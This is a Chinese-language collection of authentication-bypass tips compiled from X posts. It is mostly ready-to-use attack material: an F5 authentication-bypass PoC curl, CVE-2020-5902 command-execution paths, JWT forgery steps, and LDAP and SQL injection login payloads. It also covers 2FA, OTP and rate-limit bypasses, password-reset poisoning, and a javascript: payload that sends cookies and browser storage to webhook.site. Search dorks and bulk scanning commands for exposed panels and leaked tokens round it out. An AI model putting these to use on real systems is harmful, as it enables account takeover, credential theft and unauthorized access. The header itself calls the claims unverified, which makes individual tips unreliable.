# X 语料 · 认证与授权（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。
同一技巧被多人反复转贴的只保留一份并注明原出处；纯战绩播报、只有提问没有答复、
以及"感谢/快来关注"类内容已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[认证与会话](../by-type/authn-session.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-auth（279 条）、x-residual-auth（4 条） · 本文 298 行

## 认证绕过

- Apache Tomcat 认证绕过：/debug 直接访问返回 401，但在末尾加斜杠就变成 200。
  https://example.target.com -> 302 到 https://admin.target.com（NXDOMAIN）
  https://example.target.com/debug   -> 401 Basic Auth
  https://example.target.com/debug/  -> 200 OK
- 最简单的 403 绕过——双斜杠：
  GET site.com        => 302 到 site.com/login
  GET site.com/login  => 403
  GET site.com//login => 200
- Keycloak 管理控制台，这两条路径都值得直接打：
  /auth/admin/
  /auth/admin/master/console/
- 登录页 /login 被 IP 白名单挡住时，试 /index.php/login —— 同一个入口走了不同的路由规则。
- 从 JS 里读出跳转逻辑，直接构造带管理员用户名的 URL：
  if (data == 'SUCCESS') { location.href = "/admin/<snipped>?uname=" + username + ""; }
  → http://target.com/admin/<snipped>?uname=admin
- X-Rewrite-Url 可绕过 WordPress 的 403，把被拦的脚本换成这个头再发：
  POST /xmlrpc HTTP/1.1
  Host: target.com
  X-Rewrite-Url: xmlrpc.php
  X-Rewrite-Url: wp-json/v2/users
  X-Rewrite-Url: wp-login.php
- WordPress 常见端点清单：
  /wp-admin.php /wp-config.php /wp-content/uploads /wp-load /wp-signup.php /wp-json
  /wp-includes（目录）/ index.php / wp-login.php / wp-links-opml.php / wp-activate.php
  /wp-blog-header.php / wp-cron.php / wp-mail.php / xmlrpc.php / wp-settings.php / wp-trackback.php
- 拿到 WordPress 凭据却找不到登录页时，访问 /wp-admin/install.php，它会告诉你登录入口搬到哪了。
- WAF 拦 /wp-login.php 时，把其中一个字符做 %-编码：WAF 匹配的是原始路径，源站会解码。
  /%77p-login.php 与 /wp-login%2ephp 都返回 200，登录页完整返回。
- phpMyAdmin 的大小写差异：
  target.com/phpmyadmin/setup/index.php  ==> 301 到登录页
  target.com/phpMyAdmin/setup/index.php  ==> 200，直接进 setup
- IIS 子域上出现 302 时别放走：/testauth 这类隐藏 NTLM 端点，发空凭据即可拿到
  WWW-Authenticate 里的 NTLM challenge，用 Burp 的 NTLM challenge decoder 解出信息。
- 批量找暴露的 F5 iControl REST 接口：
  cat hosts | while read host; do curl -sk "https://$host/mgmt/shared/authn/login" | grep -q 'resterrorresponse' && printf "$host F5 iControl REST API Exposed\n"; done
- F5 认证绕过 PoC，直接打 authn/login：
  curl -ks https://victimIP/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"id"}'
- CVE-2020-5902（F5 BIG-IP）三个动作对应的路径：
  读： /tmui/login.jsp/..;/..;/tmui/tmui/locallb/workspace/fileRead.jsp?fileName=
  建： /tmui/login.jsp/..;/..;/tmui/Control/jspmap/tmui/accessctrl/ssoconfig/create.jsp
  执行：/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp
  （另有 authproperties.jsp 与 getTabSet.jsp 的反射点）
- Mediasite 视频管理系统的未授权访问：
  /Mediasite/Configure
  /Mediasite/Configure/Pages/LogViewer.aspx
- CVE-2024-27198（TeamCity）认证绕过，用分号切断路径：
  /foo?jsp=/authenticated-endpoint;.jsp
- GitLab 即使要求登录，/snippets 也常是公开的，能看到内部代码片段。先从 code. 或 gitlab. 子域找起。
- JFrog 走 .io 域时常用匿名登录，dork 一下就能进：
  site:jfrog.io inurl:yourtarget
- phpLDAPadmin 的匿名登录复选框，勾上就有读权限：
  /phpldapadmin/ → 200 → 勾 anonymous login → 读到目录结构
- phpldapadmin 的两个 XSS 点位，把它加进字典：
  phpldapadmin/index.php
  domain/phpldapadmin/cmd.php
  domain/cmd.php
- Bitnami Redmine 容器的默认账户：HTTP 用 user，SSH 用 bitnami；用户名也可能是 admin / root。
  相关路径：/bitnami/index.html、/admin、/phpmyadmin
- 字典里加一条 /faketoken。有开发遗留的调试路由，只要提供任意注册用户的手机号
  （不要鉴权、不要 OTP）就返回该用户的有效 JWT —— 零点击 ATO。
## 版本与路径变体
- API TIP 1/31 — 旧版本接口通常更弱、缺安全机制。看到 api/v3/login，就去试 api/v1/login 是否还在。
  （也有按业务事件命名的版本：/api/CharityEventFeb2020/、/api/CharityEventFeb2021/）
- 私有后台常用这些路径与子域，直接进字典：
  /dev/register/ /stag/register/ /dev/login/ /register/ /internal/ /stag/
  子域：dev. stag. admin. internal. stag-dev. stag-admin. internal-dev.
- 路径大小写也是绕过手段：
  /web/admin/ => 302 回主域
  /web/aDmiN/ => 200 后台登录页
  /web/aDmiN/FUZZ => 敏感文件
- token 端点的常见变体，全都塞进字典：
  /token /oauth2/token /oauth/token /oauth2/tokens /oauth2/v1/token /v1/token
- /ping 返回 "OK"，改成 /ping/ 就直接是后台登录页；再撞上配置不当，用个废 Google 账号就进去了。
- 有 /login 就试 /admin：把 /login 整段替换成 /admin 即可进后台。
- 只有 /login/ 没有注册入口时，把 /login/ 换成 /register 或 /signup —— 开发者常常只是忘了隐藏。
- 限速只认具体路径时，把 GET /login 改成 GET /login.random 就绕过了。
- 备份文件路径：/login/dbconf.php~
- config.bak 泄露 mysqli 与 smtp 凭据（还附带反射型 XSS）。用 dirsearch 撞到后，再用 arjun 挖隐藏参数：
  arjun -u ....../login.php
  [✓] parameter detected: reason, based on: body length
## 2FA 与会话
- 2FA 经密码重置绕过：
  1. 建号并开启 2FA
  2. 登出
  3. 走"忘记密码"重设密码
  4. 直接进入控制台，2FA 没被要求
  变体：启用 Google Authenticator 后走重置密码，若直接落到 dashboard 即为绕过。
- 2FA 验证码直接填 000000 有时就过。同类变体：先在受害者手机号上请求 OTP，
  拦截后把验证码改成 00000（或把随机码换成 true / 有效数字串），也能过。
- 2FA 响应篡改两招：
  1. 响应里 "success":false 改成 "success":true
  2. 状态码 4xx 改成 200，看限制是否被跳过
- 等 2FA 验证码过期后再提交，此时填任意码都能过——过期校验与验证逻辑没串起来。
- 旧的密码重置码可以被重复利用来：1) 激活 2FA 从而跳过验证步骤；2) 完成账号注销流程。
- 改密后旧会话不失效：
  1. 同一账号在 Chrome 与 Firefox 同时登录
  2. 在 Chrome 改密码
  3. 回 Firefox 继续操作，若能提交成功即为漏洞
  另两种同源手法：登出后把先前抄下的 cookie 粘回去（隔 2 小时仍有效）；浏览器后退键能退回个人资料页。
- 2FA 的会话缺陷：浏览器 A 登录并启用 2FA 后，先前已登录的浏览器 B 刷新仍保持有效会话。
- 主域开了 2FA，但在子域 embed.<target>.com 用同一套凭据登录后，
  子域提供"跳回主域"的选项——跳过去就有主域的完整权限，2FA 未被要求。
- 2FA 绑定的越权：绑定接口若接受 body 里的 user ID，就把 2FA 绑到受害者账号上；
  再用 /api/2fa/verify 传受害者 user ID 与你自己的有效验证码，服务端直接放行登录。
## JWT 与 OAuth
- JWT 绕过 #1：把 alg 改成 none，body 里的 claims 随便改（如 email:attacker@gmail.com），原样发送。
  JWT 绕过 #2：alg 为 RS256 时改成 HS256，再用公钥签名——公钥可从 jwks URI 拿到，
  多数情况下就是站点 HTTPS 证书里的那把。
- Google OAuth 未验证邮箱导致 ATO：
  1. 攻击者用 Google OAuth 登录并把邮箱设成未验证的受害者邮箱
  2. 应用没校验邮箱归属
  3. 受害者之后用 Google OAuth 注册
  4. 邮箱被自动关联并标记为已验证 → 完全接管
- SSO 开放重定向的两个端点，登录前后都可能被利用：
  api/auth/sso/login
  api/auth/sso/callback
- 开放重定向在认证流程里就不是 Low 了：把登录跳转指到自己的域，直接收凭据。
  login.php?url=//\\.oastify.com
- 目标跑着 Moodle 时，mod/lti/auth.php 的 redirect_uri 参数可测开放重定向：
  https://xxx/mod/lti/auth.php?redirect_uri=//example.com
- 登录参数直接吃 javascript: 时的凭据外带：
  /login?redirectUrl=javascript:fetch('http://webhook.site',{method:'POST',body:JSON.stringify({cookies:document.cookie,sessionStorage:sessionStorage,localStorage:localStorage})})
- OAuth 缺 state 参数导致一击 DoS：
  1. 用 Facebook 登录，把从 Facebook 回来时的那条 oauth URL 存下
  2. 发给受害者
  3. 受害者一点，账号就无法再访问任何功能（会话被绑死）
- \u200b（零宽空格）可用于：SSO entity id、OAuth App Name、重复邮箱注册、重复用户名注册。
  eg: username:`somefamousguy\200b` —— 会被规范化为 somefamousguy 但末尾带一个不可见字符。
- 一次性邮箱可被抢注：yopmail.com 上任何人都能领取任意用户名。
  领掉 target@yopmail.com 后，对 target.com 各资产请求密码重置，可批量接管账号。
## 密码重置与邮箱
- 密码重置投毒：多加一个 Host 头（或 X-Forwarded-Server / X-Forwarded-Host / X-Host），
  看重置链接是否指向攻击者域名。
  POST /login/forget-password HTTP/1.1
  Host: site.com
  Host: attack-domain.com
- 重置链接与邮箱绑定的时序缺陷：
  1. 申请重置
  2. 先不点链接，登录个人资料把邮箱改成自己的
  3. 再用那条（旧邮箱收到的）重置链接改密码
  4. 若改密成功，即为漏洞
- 重置接口的参数污染（也可以填管理员邮箱）：
  POST /passwordReset HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  email=victim@example.com&email=hacker@example.com
  JSON 版：{"email": ["victim@example.com", "attacker@example.com"]}
- 零点击 ATO：用"受害者用户名 + 若干空格"注册，再走密码重置，拿到的 token 可直接重设受害者密码。
- 开放重定向白名单用中文句号绕过：%E3%80%82，重点盯 SSO 的跳转参数。
- 邀请链接直接出现在响应里 → 邮箱验证绕过：
  1. 以管理员身份邀请 something@target.com
  2. 邀请链接在响应体中
  3. 用该链接登录，邮箱验证形同虚设
- 登录接口的用户枚举 —— email 参数直接换就能确认账号是否存在：
  /hub/v1/user/otp/login?email=attacker@mail.com
  /hub/v1/user/otp/login?email=victim123@mail.com
- 邮箱大小写导致重复注册：注册 abcd@gmail.com 并付费，用 Abcd@gmail.com 登录被拒，
  但用 Abcd@gmail.com 再注册一次，登录后直接继承了已付费的账号。
- 管理员用户名枚举：对每个候选名发十余次失败登录，
  若返回限速或账号锁定，说明该用户名存在。
- 业务逻辑 DoS：从 A 账号的设置里把邮箱改成 B 的（绕过前端校验），
  B 从此无法登录，报"同一邮箱不能存在两个账号"。
## 限速与 OTP
- 忘记密码的限速绕过：连发 20 次，第 10 次左右返回 "Daily limit reached"，
  此时在邮箱末尾加 %0d 继续发，又回到 "Password Reset link has been sent"。
- 两个限速绕过思路：
  1. 重复请求"重发 OTP"——上一个没用掉的 OTP 会被反复寄出
  2. 在端点里加 old，如 /api/old/login，旧版本接口常常还活着且没限速
- OTP 爆破到 ATO：服务端是按 IP 限速的，装上 burp 的 ip rotate 扩展轮换 IP，
  再对重置验证码跑 Intruder，爆破成功后即可改密。
- 更省事的限速绕过：在请求里塞一个随机参数 ?param=XYZ，用 Battering Ram 对 XYZ 与 OTP 一起跑。
- 手机号当用户名时，重置流程里 OTP 没有限速，爆破出来即可给受害者设新密码。
- OTP 响应篡改：随便填一个值，同时拦截响应，响应末尾通常有 "error" / "0" 这类标记，改成成功态。
- OTP 与手机号错配：先用攻击者号码请求 OTP，再把请求里的手机号换成受害者的，
  用攻击者收到的 OTP 提交 —— 若不校验 OTP 与号码的绑定关系，验证即被绕过。
- 同一个洞的类型混淆版：{"otp":"123456"} 返回 403，改成 {"otp":true} 返回 200 并下发 rest token。
## 越权与 IDOR
- 用 Auth Analyzer 扩展批量找 IDOR / 越权：
  1. 把不同用户的 session cookie 粘进去
  2. 启动 Analyzer
  3. 在浏览器里用用户 1 正常操作
  4. 看哪些请求返回 SAME —— 说明用户 2 也能做本该只有用户 1 能做的事
  进阶：用低权账号走完整流程，对矩阵里所有 SAME 逐条判断是"泄露数据"还是"能执行动作"。
- /.? 追加就能绕过 401：
  /omni/single-session?id=xxx   (401)
  /omni/single-session/.?id=xxx (成功，泄露 PII、证件图、地理与指纹)
- 两个把两个 ID 都塞进路径的写法：
  /auth/profile/victimid/userid
  /auth/profile/userid&victimid
- 一条信息泄露到接管后台的链路：host 返回 403 → /app 跳到企业 SSO → /app/main.js 里写着 IP:8005 与 Api_key
  → https://IP:8005/swagger/ui/index#/Admin 直接用这个 key 调后台接口拿到信息泄露。
- 子域枚举 → 对登录页做 fuzz → 撞到 /log.txt，里面明文存着邮箱与密码。
- 拿到面板后先试 /manage-users.php 这类大响应页面；状态码是 302 但内容很长的，
  用 Burp 的 Match and Replace 把 302 改成 200，直接看到后台内容。
- /api/users/$id/rest-password/ 把 OTP 放在 JWT 里返回 → 解出 OTP → 重置密码 → 管理员账号接管。
## 注入类
- LDAP 认证绕过的载荷集：
  *
  *)(&
  *)(|(&
  *)(1(&
  pwd)
  *)(|(*
  *))
  *))%00
  admin)(&)
  admin) (&)
- 后台登录框的 SQLi 载荷：
  admin' or '1'='1'#
  admin' or '1'=1
  admin' or 1=1 or "='
- 时间盲注也可以放在 cookie 或头里，用 * 标出注入位置交给 sqlmap：
  GET /menu HTTP/1.1
  Host: redacted
  Cookie: session-name=xyz; HACKERMAN=*elonmusk_elonmusk%40teslacom_false_6
## 信息泄露与枚举
- access_token 的 dork：
  site:"company.com" inurl:'access_token'
  多数是过期的，但总有几条还能用。
- 批量找后台登录页：
  cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
- 批量找登录门户：
  cat subs.txt | httpx -path /login -status-code -title -silent | grep -Ei "200|302"
- 批量对 /admin/login/?next=/admin/ 发 POST 并看标题与技术栈：
  httpx -l hosts.txt -threads 100 -x POST -paths /admin/login/?next=/admin/ -title -tech-detect -status-code -follow-redirects
- /auth.json 的敏感信息批量探测：
  subfinder -d TARGET.com | httpx -path "/auth.json" -title -status-code -content-length -t 80 -p 80,443,8080,8443,9000,9001,9002,9003
- waybackurls 捞到 login.js → 美化 → 注释里可能直接写着管理员密码。
- nuclei 报的口令常被当成误报，但值得回源码看一眼：页面里同时出现 pwd、username 与 url 时，登进去试试。
- 绕过 https://login.microsoftonline.com 的前置网关后，给 *.js 加 .js.map 后缀把 sourcemap 拖下来，
  里面有密钥和端点，再用里面的 token 打 API。
- 端口扫描结果里有 389 的，批量查匿名 LDAP：
  cat port-scanned-hosts.txt | grep -E ':389$' | awk -F: '{print $1}' | nuclei -nh -id ldap-anonymous-login
- 同理查匿名 FTP 与弱口令：
  cat port-scanned-hosts.txt | grep -E ':21$' | awk -F: '{print $1}' | nuclei -nh -id ftp-anonymous-login,ftp-weak-credentials
- 拿到 Slack key 先验活：
  curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
- GET /admin/login/?next=/admin/ 返回 200（登录框），
  POST 同一路径返回 403 且带出大量信息 —— 因为 Django 开了 DEBUG=True。
- 开放重定向被过滤时，回源码里找直接的跳转链接：
  <a href="https://attacker.com">signup</a> —— 点注册就直接走了。
- 开放重定向的发现流程：注册后进个人设置页（如 /user/settings），抄下 URL 再登出，
  重新打开时会被跳成 /login?next=user/settings —— 此时 next 就是可滥用的参数。
## 应用层自动化
- 用 ffuf 找开发遗留后门：
  1. ffuf --mc all（先看全部状态码）
  2. 5 秒后 Ctrl+C
  3. ffuf --mc all -fw <过滤词数>
  4. 找到一个开发者用来登管理员的后门，响应码是 404
- 子域筛出 api / auth 后批量扫接口动作字典：
  bash subzzZ -d target.com -s | grep 'api\|auth' | xargs -I@ -P500 sh -c "dirsearch.py -u @ -E --clean-view -t 50 -H 'Origin: @' -H 'Referer: @' -H 'X-Forwarded-For: 127.0.0.1' -u '@' -w api_actions.txt -b"
- katana 用来挖隐藏 API、.js、后台路径与参数（这些常缺鉴权校验）：
  katana -u https://target.com -d 5 -c 10 -o saveR.txt
## Google dork
- 后台登录页的 dork：
  site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login
  inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth | inurl:sso
- dork 流程：先 site:<domain>，再逐个 -www -shop -share -ir -mfa 把噪音剥掉，
  一直剥到剩下有意思的东西为止。
  site:tesla.com -www -shop -share -ir -mfa
- 范围写成 *.target.* 时，用 dork 找新 TLD：
  site:*.target.*
  site:*.target.* inurl:/login
  site:*.target.* ext:php
- 手工测 ATO / 业务逻辑 / 越权 / IDOR 的主 dork：
  ("login"|"signup"|"signin"|"register"|"create"|"portal"|"registeration"|"join"|"internal"|"logon") site:*.target.com -www
- 三个 CMS 的 dork：
  inurl:/wp-admin/admin-ajax.php
  intext:"Powered by" & intext:Drupal & inurl:user
  site:*/joomla/login
- Jira 面板的 dork：inurl:login.jsp site:*.xyz.com
- CVE-2020-3452（Cisco SSL-VPN）的 dork：inurl:logon.html "CSCOE"
  搜到的是暴露的 Cisco VPN 域名，不全都可打，但比例不低；进到登录页后再试 PoC。
- CVE-2022-34305（Tomcat）的 dork：http.title:"Login Page for Examples"
  对应路径 /examples/jsp/security/protected/index.jsp
- AEM 的素材目录与凭据泄露组合：
  inurl:'/content/dam'
  intext:.@target.com
  intext:"admin, login, password"
- 带用户名密码字段的后台页：
  site:"*.domain.tld" intitle:admin intext:login intext:username | email intext:password -help -docs -support -news
- 登录页响应篡改的另外一个应用：把 /login 直接替换成 /admin，很多站点不校验就直接放行。
- HTTP 方法覆盖绕过鉴权：
  1. 某端点只允许 GET
  2. 用 POST 发、并带 _method=GET
  3. 后端按 GET 处理
  4. 受限功能被访问到
- 把 /admin 直接拼在域名后面就有面板的情况不少见，遇到登录页先试一次。
